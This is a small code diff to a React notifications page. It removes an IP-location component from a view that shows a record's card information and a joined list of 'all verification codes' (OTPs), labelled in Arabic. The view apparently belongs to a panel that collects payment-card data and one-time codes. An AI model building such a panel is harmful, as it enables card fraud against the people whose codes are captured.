@@ -325,7 +325,6 @@ export default function NotificationsPage() {
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                 {selectedNotification.cardInfo.allOtps.join(',')}
               </p>
-              <IPLocation />
               <div className="flex justify-between mx-1">
                 <Button
                   onClick={() => {
